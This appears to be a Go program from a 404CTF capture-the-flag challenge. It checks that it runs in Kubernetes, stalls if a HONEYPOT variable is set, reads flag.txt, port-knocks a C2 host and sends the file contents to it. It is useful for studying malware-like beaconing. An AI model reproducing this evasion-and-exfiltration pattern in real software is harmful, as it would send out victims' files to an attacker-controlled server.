package main

import (
	"bufio"
	"fmt"
	"net"
	"os"
	"time"
)

const env_name = "flag"

func main() {
	if _, err := os.Stat("/var/run/secrets/kubernetes.io"); os.Getenv("KUBERNETES_SERVICE_HOST") == "" || os.IsNotExist(err) {
		panic("not running in Kubernetes")
	}
	if os.Getenv("HONEYPOT") != "" {
		for {
			time.Sleep(time.Second)
		}
	}
	mysecret, err := os.ReadFile("flag.txt")
	if err != nil {
		panic(err)
	}
	fmt.Printf("%s", mysecret)
	knock, err := net.Dial("tcp", "c2.challenges.404ctf.fr:1337")
	if err != nil {
		panic(err)
	}
	knock.Close()
	time.Sleep(time.Second)
	knock2, err := net.Dial("tcp", "c2.challenges.404ctf.fr:1338")
	if err != nil {
		panic(err)
	}
	knock2.Close()
	time.Sleep(time.Second)
	knock3, err := net.Dial("tcp", "c2.challenges.404ctf.fr:1339")
	if err != nil {
		panic(err)
	}
	knock3.Close()
	time.Sleep(time.Second)
	conn, err := net.Dial("tcp", "c2.challenges.404ctf.fr:31337")
	if err != nil {
		panic(err)
	}
	conn.Write(mysecret)
	flag, err := bufio.NewReader(conn).ReadString('\n')
	if err != nil {
		panic(err)
	}
	fmt.Print(flag)
	conn.Close()
}
